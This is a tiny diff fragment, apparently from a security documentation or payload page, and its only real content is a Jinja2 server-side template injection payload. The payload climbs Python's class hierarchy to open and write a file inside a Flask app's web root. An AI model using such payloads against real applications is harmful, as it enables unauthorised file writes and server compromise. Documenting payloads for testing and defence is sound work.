@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:23:35.653183+00:00'
 ```python
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
 ```
+
+
